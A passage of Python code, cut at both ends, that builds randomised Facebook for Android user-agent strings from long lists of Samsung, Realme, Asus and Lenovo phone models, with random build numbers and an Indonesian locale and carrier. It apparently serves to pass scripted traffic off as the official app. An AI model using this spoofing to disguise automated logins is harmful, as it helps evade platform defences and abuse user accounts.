'GT-S7562C', 'GT-S7562L', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'SPH-D710', 'SHV-E120S', 'SHV-E120L', 'SHV-E120K/KKJMD2', 'SHV-E120L', 'SHV-E120LSK', 'SHV-E120LSK', 'SHV-E120LKS', 'SHV-E120S', 'SHV-E120S', 'SHV-E120S', 'SHV-E120S', 'SHV-E120S/KKJMD2', 'GT-I9105P', 'GT-I9105', 'GT-I9105', 'GT-I9105P', 'GT-I9105', 'GT-I9105', 'ISW11SC', 'SCH-I535', 'GT-I9300', 'GT-I9300', 'GT-I9305', 'SCH-R530X', 'SCH-R530X', 'SCH-R530U', 'GT-I9305T', 'SCH-R530C', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190N', 'GT-I8190', 'GT-I8190T', 'GT-I8190N', 'GT-I8200N', 'GT-I8200', 'GT-I8200', 'GT-I8200N', 'GT-I8200', 'GT-I8200L', 'GT-I8200', 'GT-I8200Q', 'GT-I8200Q', 'GT-I9301I', '720x1280', 'Samsung Galaxy S IV(I950X)', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'SAMSUNG GT-I9001/I9001BOKQ4', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'SM-G973F', 'SAMSUNG SM-G973F', 'SAMSUNG SM-G973U', 'SM-G977N', 'SM-G973U1', 'SAMSUNG SM-G973F/G973FXXSGHWC2', 'SAMSUNG SM-G977N', 'SAMSUNG SM-G770F', 'SM-G770F/DS', 'SM-G975F', 'SAMSUNG SM-G975F', 'SM-G975U', 'SM-G975U1', 'SAMSUNG SM-G975U', 'SAMSUNG SM-G975F/G975FXXSGHWC2', 'SC-05L', 'SM-G970F', 'SAMSUNG SM-G970F/G970FXXSGHWA3', 'SM-G970U', 'SM-G970U1', 'SAMSUNG SM-G980F', 'SM-G980F/DS', 'SM-G981U', 'SM-G981U', 'SM-G981B', 'SCG01', 'SM-G981U1', 'SM-G981W', 'SM-G981V', 'SM-G981N', 'SC-51A', 'SM-G9810', 'SC51Aa', 'SM-G780G', 'SAMSUNG SM-G780F', 'SAMSUNG SM-G780G', 'SM-G781B', 'SM-G781V', 'SM-G781U', 'SM-G781U1', 'Galaxy S20 Ultra', 'SM-G988B', 'SM-G988W', 'SM-G988U', 'SAMSUNG SM-G988B', 'SM-G988U1', 'SM-G988N', 'SAMSUNG SM-G985F/G985FXXSFFVIB', 'SM-G985F/DS', 'SM-G986B', 'SM-G986U', 'SAMSUNG SM-G986B', 'SM-G986N', 'SM-G986W', 'SM-G986U1', 'Galaxy S21', 'SM-G991W', 'SM-G991U1', 'SM-G991B', 'SM-G991B', 'SM-G991B', 'SC-51B', 'SM-G991V', 'SM-G990U2', 'SM-G990B2', 'SAMSUNG SM-G990B', 'SM-G990E', 'SAMSUNG SM-G990B/G990BXXU4EWC7', 'SM-G998U', 'SAMSUNG SM-G998B', 'SM-G998N', 'SM-G998U1', 'SAMSUNG SM-G998U', 'SM-G998W', 'Galaxy S21+', 'SM-G996U', 'SM-G996B', 'SM-G996N', 'SM-G996B', 'SM-G9960', 'SM-S901U', 'SAMSUNG SM-S901U', 'SM-S901U1', 'SM-S901B', 'SAMSUNG SM-S901B', 'SM-S901W', 'SAMSUNG SM-S908E', 'SM-S908B', 'SAMSUNG SM-S908U', 'SM-S908U1', 'SM-S9080', 'SM-S908U1', 'SAMSUNG SM-S908B', 'SM-S906E', 'SM-S906U', 'SAMSUNG SM-S906N', 'SM-S906E', 'SM-S906U', 'SAMSUNG SM-S906B', 'SM-S906U1', 'SM-S906W', 'SM-S911W', 'SM-S911B', 'SM-S911U', 'SM-S911U1', 'SM-S918W', 'SAMSUNG SM-S918B/S918BXXS1AWD1', 'SM-S918U', 'SM-S918U1', 'SM-S916U', 'SM-S916B', 'SM-S916U1', 'SM-S916W', 'Galaxy S3', 'Samsung Galaxy S3', 'Galaxy S3', 'SM-G730V', 'SAMSUNG-SM-G730A', 'SM-G730W8', 'SAMSUNG-SM-G730A', 'SM-G730W8', 'SM-G730W8', 'GT-I9505', 'SAMSUNG GT-I9505/I9505XXUBMEA', 'SCH-I959', 'SAMSUNG GT-I9505-ORANGE', 'SCH-I545', 'GT-I9500', 'SAMSUNG GT-I9505/I9505XXUBMEA', 'SAMSUNG GT-I9505', 'SAMSUNG GT-I9505/I9505XXUAMDC', 'SAMSUNG GT-I9505/I9505XXUDMGG', 'GT-I9295', 'SHV-E330S', 'SHV-E330L', 'SAMSUNG SHV-E330L', 'SHV-E330S', 'SHV-E330K', 'SAMSUNG SHV-E330S', 'SHV-E330K', 'GT-I9195', 'lineage_serranoltexx', 'GT-I9195I', 'GT-I9192I', 'GT-I9190', 'GT-I9192', 'SCH-I435', 'GT-I9515', 'GT-I9506', 'SAMSUNG GT-I9506', 'SAMSUNG SM-C105L', 'SAMSUNG SM-C101', 'SAMSUNG SM-C101', 'SAMSUNG SM-C101', 'SAMSUNG SM-C105', 'SM-C105K', 'SM-C105S', 'SM-C105L', 'SM-C105K', 'SM-C105S', 'SM-C105L', 'SM-C105S', 'SM-C105L', 'SM-G900T', 'SM-G900F', 'SM-G900V', 'SM-G900M', 'SM-G900F', 'SM-G900P', 'SM-G900H', 'SM-G9006V', 'SM-G900F', 'SM-G870W', 'SAMSUNG-SM-G890A', 'SAMSUNG-SM-G870A', '1080x1920', 'SAMSUNG SM-G890A', 'SM-G900FD', 'SM-G860P', 'SM-G901F', 'SAMSUNG SM-G901F/G901FXXU1CPHA', 'SM-G800F', 'SM-G800H', 'SM-G903F', 'SM-G903W', 'SM-G920I', 'SM-G920P', 'SM-G920F', 'SM-G920W8', 'SAMSUNG SM-G920F', 'SM-G920K', 'SAMSUNG-SM-G920A', 'SM-G925F', 'SM-G925K', 'SAMSUNG-SM-G925A', 'SM-G9250', 'SAMSUNG SM-G925F', 'SAMSUNG SM-G928F', 'SAMSUNG-SM-G928A', 'SM-G928C', 'SM-G9280', 'SM-G9287', 'SAMSUNG SM-G928T', 'SM-G928I', 'SM-G930F', 'SM-G930W8', 'SAMSUNG SM-G930F', 'SM-G930V', 'SM-G930U', 'SM-G930S', 'SM-G930L', 'SM-G9300', 'SAMSUNG-SM-G891A', 'SAMSUNG SM-G891A', 'SM-G935F', 'SM-G935U', 'SAMSUNG SM-G935A', 'SM-G935T', 'SM-G935VC', 'SM-G935S', 'SM-G935L', 'SAMSUNG SM-G935W8', 'SM-G9350', 'SAMSUNG SM-G950U', 'SAMSUNG SM-G950F', 'SM-G950U1', 'SM-G950N', 'SC-02J', 'SAMSUNG SM-G950W', 'SM-G892A', 'SAMSUNG SM-G892A', 'SAMSUNG SM-G892U', 'SM-G8750', 'SM-G8750', 'SM-G8750', 'SAMSUNG SM-G8750', 'SM-G955U', 'SM-G955F', 'SAMSUNG SM-G955F/G955FXXUCDVG4', 'SM-G955W', 'SM-G9550', 'SM-G960F', 'SM-G960U', 'SAMSUNG SM-G960U1', 'SAMSUNG SM-G960F', 'SM-G965U', 'SM-G965F', 'SM-G965F', 'SM-G965U1', 'SM-G9650', 'SAMSUNG-SM-J321AZ', 'SAMSUNG-SM-J321AZ', 'SAMSUNG SM-J321AZ', 'SAMSUNG-SM-J326AZ', 'SM-J336AZ', 'SAMSUNG SM-J336AZ', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700L', 'GT-I5700', 'GT-I5700', 'GT-I5700L', 'GT-I5700R', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-S5280', 'GT-S5280', 'GT-S5280', 'GT-S5280', 'SCH-I200', 'SCH-I200PP', 'SCH-I200', 'SCH-I200PP', 'SCH-I200', 'SCH-I200PP', 'SCH-I200PP', 'SCH-I200PP', 'SCH-I829', 'SCH-I829', 'SCH-I829', 'SCH-I829', 'SCH-I829', 'GT-P1000', 'GALAXY TAB', 'Galaxy Tab', 'GT-P1000', 'Galaxy Tab 2', 'Galaxy Tab 2 3G', 'GT-P3100', 'Flow', 'GT-P3113', 'GT-P3113', 'GT-P3110', 'GT-P3110', 'SM-T116', 'SM-T116NU', 'SM-T116NY', 'SM-T116NQ', 'Galaxy Tab 4', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'Galaxy Tab KT107', 'Galaxy Tab Pro', 'Galaxy Tab PRO 10', 'SAMSUNG-SM-T2519', 'Samsung galaxy tab s3', 'Galaxy Tab2 3G', 'Galaxy Tab3 P5200', 'Galaxy Tab3 T311', 'Galaxy Tab4', 'GT-S7560', 'SAMSUNG GT-S7560/S7560XXBNC2', 'GT-S7560M', 'SAMSUNG GT-S7560/S7560XXBNJ1', 'SAMSUNG GT-S7560/S7560XXAME9', 'SAMSUNG GT-S7560/S7560XXAMH3', 'SAMSUNG-SCH-I699I', 'GT-S7560M', 'GT-S7560M', 'GT-S7560M', 'GT-S7560M', 'SCH-I699I', 'SAMSUNG-SCH-I699I', 'GT-S7560M', 'GT-S7560', 'GT-S7560', 'GT-S7560', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', '800x1212', 'GT-S7390', 'GT-S7390', 'GT-S7390G', 'GT-S7390', 'GT-S7580', 'GT-S7580', 'GT-S7580L', 'SAMSUNG GT-S7580/S7580XXUBOA1', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580L', 'SM-G318MZ', 'SM-G318HZ', 'GT-I8150', 'GT-I8150', 'GT-I8150', 'GT-I8150', 'SM-T255S', 'SM-T255S', 'SM-T255S', 'SM-T255S', 'SM-T255S', 'GT-I8150', 'SAMSUNG-SM-W2016', 'SM-W2016', 'SM-W2018', 'SM-W2018', 'SAMSUNG SM-W2019', 'SM-W2019', 'SAMSUNG SM-W2021', 'SM-W2021', 'SM-W2021', 'SAMSUNG SM-W2022', 'SAMSUNG SM-W9023', 'SM-G600S', 'SAMSUNG SM-G600S', 'SAMSUNG SM-E426S', 'GT-I8552', 'GT-I8552', 'GT-I8552B', 'GT-I8552', 'GT-I8552', 'SM-G3812', 'SM-G3812', 'SM-G3812B', 'SM-G3812B', 'SM-G3812', 'SM-G3812', 'Samsung SM-G3818', 'SM-G3818', 'SM-G3812', 'Galaxy Wonder', 'SX Galaxy Xcove 4S', 'GT-S7710L', 'GT-S7710', 'GT-S7710', 'GT-S7710-ORANGE/S7710XXANE3', 'GT-S7710', 'GT-S7710', 'GT-S7710L', 'GT-S7710', 'GT-S7710L', 'GT-S7710', 'GT-S7710', 'GT-S7710', 'GT-S7710L', 'SM-G388F', 'SAMSUNG SM-G388F', 'SM-G389F', 'SM-G390F', 'SM-G390W', 'SM-G398FN', 'SAMSUNG SM-G398FN', 'SM-G525F', 'SM-G525N', 'SAMSUNG SM-G525F', 'SM-G736U1', 'SM-G736B', 'SM-G736W', 'SAMSUNG SM-G736B', 'SM-G889A', 'SM-G715FN', 'SAMSUNG SM-G715FN', 'SM-G715U1', 'SM-G715W', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'gt-s5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360L', 'GT-S5360L', 'GT-S5360L', 'GT-B5510-ORANGE/B5510BVLH1', 'GT-B5510', 'GT-B5510', 'GT-B5510', 'GT-B5510', 'SAMSUNG GT-B5510/B5510XXLE1', 'SAMSUNG GT-B5510/B5510XXLL1', 'GT-B5510', 'GT-B5510L', 'GT-B5510B', 'GT-B5510L', 'GT-B5510', 'GT-B5510', 'GT-B5510-ORANGE/B5510BVLH1', 'GT-B5510-ORANGE/B5510BVLF1', 'GT-B5510-ORANGE/B5510BVLD1', 'GT-B5510-ORANGE/B5510BVLB1', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512B', 'GT-B5512B', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512B', 'GT-S6310N', 'GT-S6310B', 'GT-S6310N', 'GT-S6310N', 'GT-S6310N-ORANGE/S6310NXXAMK1', 'GT-S6310T', 'GT-S6310T', 'GT-S6310L', 'GT-S6310L', 'GT-S6310L', 'GT-S6310T', 'GT-S6310N', 'GT-S6310L', 'SM-G130H', 'SM-G130HN', 'SM-G130E', 'SM-G130BT', 'SM-G130BU', 'SM-G130BU', 'SM-G130BU', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'SM-F700N', 'U', 'SM-F700U1', 'SM-F7000', 'SM-F700W', 'SM-F711U1', 'SAMSUNG SM-F711B/F711BXXU2CVC7', 'SM-F711N', 'SAMSUNG SM-F711U', 'SM-F721B', 'SM-F721U', 'SAMSUNG SM-F721B', 'SM-F721U1', 'SM-F707B', 'SAMSUNG SM-F707B', 'SM-F707U', 'SM-F7070', 'SM-F707U1', 'SM-F707UZAAXAA', 'SM-F707W', 'SM-F916B', 'SM-F916U', 'SAMSUNG SM-F916B', 'SAMSUNG SM-F916U1', 'SM-F926U', 'SM-F926B', 'SM-F9260', 'SM-F926N', 'SM-F926W', 'SAMSUNG SM-F926B', 'SM-F936U', 'SAMSUNG SM-F936B', 'SM-F936U', 'SM-F936U1', 'SAMSUNG SM-F936W', 'galaxy Z Fold2', 'SAMSUNG SM-Z130H', 'SM-Z200F', 'SM-Z300H', 'SM-Z300H', 'SAMSUNG SM-Z300H', 'Gear Live', 'SM-R750', 'GT-I9060I', 'GT-I9060I', 'Samsung J600GN,telcel,mx', 'SAMSUNG M2004J19C', 'SAMSUNG M2006C3LG', 'SAMSUNG M2102J20SG', 'Samsung M6', 'Samsung N70', 'SAMSUNG N9106', 'SAMSUNG-N9106', 'SAMSUNG-N9106HD', 'GT-I8000', 'SAMSUNG-P9700', 'SAMSUNG S2_PRO', 'SM-G530T1', 'SAMSUNG-T805C', 'SAMSUNG-T805S', 'SAMSUNG-T950S', 'GT-S8500'])
                self.useragent = (f'[FBAN/FB4A;FBAV/{self.app_version};FBBV/{random.randint(000000000, 999999999)};FBDM/' + '{' + str(self.density) + '}' + f';FBLC/id_ID;FBRV/0;FBCR/INDOSAT;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/{self.android_model};{self.android_version};FBCA/{self.arm64_v7a};]')
            elif "Realme" in str(self.device):
                self.android_model = random.choice(['RMX3630', 'RMX3663', 'RMX3663', 'RMX3661', 'RMX3687', 'RMX3686', 'RMX3687', 'RMX3687', 'RMX1805', 'RMX1809', 'RMX1805', 'RMX1801', 'RMX1807', 'RMX1821', 'RMX1825', 'RMX1851', 'RMX1827', 'RMX1911', 'RMX1971', 'RMX2030', 'RMX1925', 'RMX2001', 'RMX2061', 'RMX2040', 'RMX2002', 'RMX2151', 'RMX2155', 'RMX2170', 'RMX2103', 'RMX3085', 'RMX3241', 'RMX3081', 'RMX3151', 'RMX3381', 'RMX3521', 'RMX3388', 'RMX3474', 'RMX3474', 'RMX3472', 'RMX3471', 'RMX3393', 'RMX3392', 'RMX3491', 'RMX3612', 'RMX1811', 'RMX2185', 'RMX2185', 'RMX3231', 'RMX2189', 'RMX2180', 'RMX2195', 'RMX2101', 'RMX2101', 'RMX1941', 'RMX1941', 'RMX1945', 'RMX1945', 'RMX3063', 'RMX3061', 'RMX3201', 'RMX3261', 'RMX3263', 'RMX3191', 'RMX3193', 'RMX3195', 'RMX3197', 'RMX3269', 'RMX3268', 'RMX2020', 'RMX2027', 'RMX2021', 'RMX3623', 'RMX3581', 'RMX3690', 'RMX3501', 'RMX3503', 'RMX3501', 'RMX3624', 'RMX3511', 'RMX3710', 'RMX3311', 'RMX3310', 'RMX3551', 'RMX3301', 'RMX3300', 'RMX2202', 'RMX2202', 'RMX3363', 'RMX3360', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3370', 'RMX3370', 'RMX3370', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3561', 'RMX3561', 'RMX3560', 'RMX3562', 'RMX3563', 'RMX3371', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3706', 'RMX3350', 'RMX3350', 'RMX3350', 'RMX2193', 'RMX2193', 'RMX2161', 'RMX2163', 'RMX2050', 'RMX2050', 'RMX2156', 'RMX3242', 'RMX3171', 'RMX3286', 'RMX3572', 'RMX3395', 'RMX3395', 'RMX3396', 'RMX3396', 'RMX3430', 'RMX3516', 'RMX3235', 'RMX3235', 'RMX3506', 'RMX3506', 'RMP2103', 'RMP2102', 'RMP2102', 'RMP2106', 'RMP2105', 'RMP2107', 'RMP2108', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX3161', 'RMX3161', 'RMX3161', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX3142', 'RMX3142', 'RMX3461', 'RMX3461', 'RMX3478', 'RMX3478', 'RMX3372', 'RMX3372', 'RMX3372', 'RMX3574', 'RMX1831', 'RMX3121', 'RMX3122', 'RMX3121', 'RMX3125', 'RMX3125', 'RMX3042', 'RMX3041', 'RMX3041', 'RMX3043', 'RMX3042', 'RMX3092', 'RMX3093', 'RMX3092', 'RMX3611', 'RMX3611', 'RMX3610', 'RMX3611', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3475', 'RMX2201', 'RMX2200', 'RMX2200', 'RMX2200', 'RMX2111', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1991', 'RMX1992', 'RMX1993', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX2083', 'RMX2142', 'RMX2081', 'RMX2086', 'RMX2144', 'RMX2071', 'RMX2071', 'RMX2071', 'RMX2075', 'RMX2076', 'RMX2072', 'RMX2072', 'RMX2072', 'RMX2052', 'RMX2176', 'RMX2176', 'RMX2121', 'RMX2121', 'RMX2121', 'RMX3115', 'RMX3115', 'RMX3115', 'RMX1921', 'RMX1921', 'RMX1921'])
                self.useragent = (f'[FBAN/FB4A;FBAV/{self.app_version};FBBV/{random.randint(000000000, 999999999)};FBDM/' + '{' + str(self.density) + '}' + f';FBLC/id_ID;FBRV/0;FBCR/INDOSAT;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/{self.android_model};{self.android_version};FBCA/{self.arm64_v7a};]')
            elif "Asus" in str(self.device):
                self.android_model = random.choice(['ME171', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'ME371MG', 'K01N', 'K012', 'K00E', 'K019', 'K00Z', 'K00Z', 'K016', 'K016', 'K00G', 'K00G', 'K50IJ', 'ME172V', 'ME172V', 'ME172V', 'ME172V', 'K00F', 'K01E', 'K00R', 'K017', 'K013', 'K007', 'K01A', 'ASUS MeMO Pad 7', 'K015', 'K011', 'K00L', 'ME302C', 'ME302C', 'ME302C', 'AOSP on Duma', 'ME302KL', 'ME302KL', 'K00U', 'ME173X', 'ME173X', 'ME173X', 'ME173X', 'ASUS K00S', 'ME301T', 'ME301T', 'ME301T', 'PadFone', 'PadFone', 'PadFone 2', 'PadFone 2', 'PadFone T008', 'PadFone T008', 'PadFone T004', 'ASUS_T00E', 'PadFone T00C', 'Padfone t00c', 'PadFone T00C', 'ASUS_T00N', 'ASUS PadFone X', 'ASUS_T00T', 'ASUS_Z01QD', 'ZS600KL', 'ASUS_I001DE', 'ZS660KL', 'ASUS_I001DA', 'ASUS_I001DC', 'ZS660KL', 'ASUS_I003DD', 'ZS661KS', 'ASUS_I003DD', 'ZS661KS', 'ASUS_I005DA', 'ASUS_I005DC', 'ASUS_AI2201_C', 'ASUS_AI2201_D', 'ASUS_AI2201_F', 'ASUS_AI2203_D', 'ASUS_AI2203_C', 'ASUS_AI2203_B', 'ASUS TAB A8', 'Tinker Board', 'Tinker Board 2', 'Tinker Board S', 'TX201LA', 'TX201LA', 'K010', 'K018', 'K018', 'TF300T', 'ASUS Pad TF300T', 'K01B', 'K00C', 'K00C', 'ASUS XPad 10LTE', 'ASUS Z101', 'ASUS Z101 Prime', 'ASUS_Z008D', 'ASUS_Z00AD', 'Z00D', 'ASUS_Z00LD', 'ASUS_Z00ED', 'ASUS_Z00RD', 'ASUS ZenFone 2E', 'ASUS_Z012D', 'ZE520KL', 'ASUS_Z017D', 'ASUS_Z012DA', 'ASUS_Z017DA', 'ASUS_Z012S', 'ASUS_Z012DE', 'ASUS_Z01FD', 'ASUS_Z016S', 'ZS550KL', 'ASUS_Z01BD', 'ASUS_Z01BS', 'ZC551KL', 'ASUS_Z01BDB', 'ASUS_X00DDB', 'ASUS_X008D', 'ASUS_X00DDA', 'ZC553KL', 'ASUS_X008DB', 'ASUS_A001', 'ASUS_Z01HDA', 'ZE553KL', 'ASUS_X00LD', 'ASUS_Z01KDA', 'ASUS_Z01KS', 'ASUS_X00LDB', 'ASUS_T00I', 'ASUS_X00HD', 'ASUS_X00ID', 'ZC554KL', 'ASUS_X015D', 'ASUS_X015D', 'ASUS_Z01GS', 'ASUS_Z01GD', 'ASUS_X00LDA', 'ZD553KL', 'ASUS_Z01MD', 'ASUS_Z01MDA', 'ZD552KL', 'ASUS_X00QD', 'ASUS_X00QD', 'ASUS_T00J', 'ASUS_X00QSA', 'ZE620KL', 'ASUS_T00F', 'ASUS_T00F', 'ASUS_T00K', 'ASUS_X017DA', 'ASUS_T00P', 'ASUS_Z01RD', 'ASUS_Z01RD', 'Zenfone 5Z', 'ZS620KL', 'ASUS_T00G', 'ASUS_I01WD', 'ASUS_T00G', 'ASUS_Z002', 'ZS630KL', 'ASUS_I002D', 'ZS670KS', 'ZS671KS', 'ASUS_I006D', 'ASUS_I004D', 'ASUS_AI2202', 'ASUS_AI2202_B', 'ASUS_A002', 'ASUS_A002A', 'ASUS_Z007', 'ASUS_X00ADA', 'ASUS_X00BD', 'ASUS_X007D', 'ZB500KL', 'ASUS_Z00SD', 'ZB551KL', 'ASUS_L001', 'ZB500KG', 'ASUS_Z00VD', 'ASUS_X013DA', 'ASUS_X013D', 'ASUS_X014D', 'ASUS_X014D', 'ASUS_X013DB', 'G550KL', 'G550KL', 'G553KL', 'ASUS_Z00YD', 'ASUS_A007', 'ASUS_X00RD', 'G552KL', 'ASUS_Z010DD', 'ASUS_Z010DB', 'ASUS_Z010D', 'ASUS_Z010DA', 'ASUS_X00PD', 'ZB555KL', 'ASUS_X01AD', 'ZB633KL', 'ASUS_X018D', 'ASUS_X018DC', 'ASUS_X00TD', 'ASUS_X00TDB', 'ASUS_X00TDE', 'ZB602KL', 'ASUS_X01BDA', 'ASUS_A001D', 'ASUS_X002', 'ASUS_X003', 'ASUS_X003', 'ASUS_X550', 'ASUS_X00GD', 'ASUS_X005', 'ASUS_Z00UDB', 'ASUS_Z00UD', 'ASUS_A006', 'ASUS_A009', 'ASUS_Z00XS', 'P01T_1', 'P021', 'P00L', 'P00C', 'P028', 'P027', 'ASUS_P00I', 'P001', 'P008', 'ASUS_P00J', 'ASUS ZenWatch', 'ASUS ZenWatch 2'])
                self.useragent = (f'[FBAN/FB4A;FBAV/{self.app_version};FBBV/{random.randint(000000000, 999999999)};FBDM/' + '{' + str(self.density) + '}' + f';FBLC/id_ID;FBRV/0;FBCR/INDOSAT;FBMF/ASUS;FBBD/ASUS;FBPN/com.facebook.katana;FBDV/{self.android_model};{self.android_version};FBCA/{self.arm64_v7a};]')
            elif "Lenovo" in str(self.device):
                self.android_model = random.choice(['lenovo1023', 'Lenovo 1023', 'Lenovo 3056', 'Lenovo 3300A', 'Lenovo 76S', 'Lenovo 8389', 'Lenovo A 319', 'Lenovo A1010a20', 'Lenovo A1000', 'IdeaTabA1000L-F', 'Lenovo A1000', 'Lenovo-A101', 'Lenovo A1900', 'Lenovo A2010l36', 'Lenovo_a2010', 'Lenovo A2010l36/S100', 'Lenovo A2016b31', 'A2107A-H', 'IdeaTab A2107A-H', 'IdeaTab A2107A-H', 'IdeaTab A2107A-H', 'Lenovo A2107', 'IdeaTab A2107A-H', 'IdeaTab A2107A-H', 'Lenovo A2580', 'Lenovo-A269i/S001', 'id Lenovo_A269i', 'Lenovo A2860', 'Lenovo A288t', 'Lenovo L18021', 'Lenovo L18021', 'Lenovo L18021', 'Lenovo A308t', 'Lenovo A316', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo_A318t', 'Lenovo A319', 'Lenovo A319', 'Lenovo A319', 'Lenovo A319', 'Lenovo A319', 'Lenovo A320t', 'Lenovo A328', 'Lenovo A328t', 'Lenovo A328', 'Lenovo A330e', 'Lenovo A330e', 'Lenovo A338T', 'Lenovo A338t', 'Lenovo A355e', 'Lenovo A358t', 'Lenovo A360t', 'Lenovo A360t', 'Lenovo A360t', 'Lenovo A368t', 'Lenovo A3690', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'id Lenovo_A369i', 'Lenovo A378t', 'Lenovo A378t', 'Lenovo A3860', 'Lenovo A388t', 'Lenovo A3900', 'Lenovo A3910t30', 'Lenovo A396', 'Lenovo A398t', 'Lenovo A399', 'Lenovo A399', 'Lenovo A399', 'Lenovo A4526', 'L18011', 'Lenovo L18011', 'Lenovo A5000', 'Lenovo A5000', 'Lenovo A5000', 'Lenovo A516', 'Lenovo A516', 'Lenovo A516', 'Lenovo-A516/S111', 'Lenovo A516', 'Lenovo A520/S101', 'Lenovo A526', 'LENOVO A526', 'Lenovo A526', 'LENOVO A526', 'Lenovo A526', 'Lenovo A526', 'Lenovo A526', 'Lenovo A526', 'Lenovo A529', 'Lenovo A529', 'Lenovo A536', 'Lenovo A536', 'Lenovo A536', 'Lenovo A560', 'Lenovo A560', 'Lenovo A560/JLS36C', 'Lenovo A5600', 'Lenovo A5600', 'LNV-Lenovo_A560e', 'Lenovo A5860', 'LenovoA588t', 'Lenovo A590', 'Lenovo L18081', 'Lenovo L19041', 'Lenovo A6000', 'Lenovo A6000', 'Lenovo A6000 Plus', 'Lenovo A6010', 'Lenovo A6010', 'Lenovo A6010Pro', 'Lenovo A606', 'Lenovo A606', 'Lenovo A616', 'Lenovo A630', 'Lenovo A630/S001', 'Lenovo A630t', 'Lenovo A630t', 'Lenovo A656', 'Lenovo A66/S001', 'Lenovo A660', 'Lenovo A660', 'Lenovo A660', 'Lenovo A6600', 'Lenovo A6600d40', 'Lenovo A6600a40', 'Lenovo A670t', 'Lenovo A680', 'Lenovo A680', 'Lenovo A680_ROW', 'Lenovo A6800', 'Lenovo A688t', 'Lenovo A690', 'Lenovo A690/S001', 'Lenovo L19111', 'Lenovo A7000 Plus', 'Lenovo A7000a', 'Lenovo A706', 'LENOVO A706', 'Lenovo_A706/JZO54K', 'Lenovo A708t', 'Lenovo A750', 'Lenovo A750', 'Lenovo A760', 'Lenovo A760', 'Lenovo_A766/JOP40D', 'Lenovo A768t', 'Lenovo A7700', 'Lenovo A788t', 'Lenovo A788t', 'Lenovo A789', 'lenovo A789', 'LENOVO A789', 'Lenovo L10041', 'Lenovo A800', 'Lenovo A800', 'Lenovo A805e', 'Lenovo A808', 'Lenovo A808t', 'Lenovo A808t', 'Lenovo A808t', 'Lenovo A816', 'Lenovo A816', 'Lenovo A820', 'Lenovo A820', 'Lenovo A820', 'Lenovo_A820', 'lenovoA820c', 'Lenovo A820e', 'Lenovo A820t', 'Lenovo A828t', 'Lenovo A828t', 'Lenovo A830', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'lenovoA850c', 'Lenovo A850i', 'Lenovo A858t', 'LENOVO A859', 'Lenovo A859', 'Lenovo A859', 'Lenovo A859', 'Lenovo A859', 'Lenovo A880', 'Lenovo A880', 'Lenovo A880', 'Lenovo A880', 'Lenovo A889', 'Lenovo A889', 'Lenovo A889', 'Lenovo A916', 'Lenovo A916', 'Lenovo_A916', 'Lenovo A916', 'Lenovo A938t', 'Lenovo A2016b30', 'Lenovo K10a40', 'Lenovo D101', 'Lenovo-D101', 'd-42A', 'Lenovo TB-X104F', 'Lenovo TB-X104L', 'Lenovo G756', 'Lenovo A806', 'Lenovo A936', 'Lenovo A936', 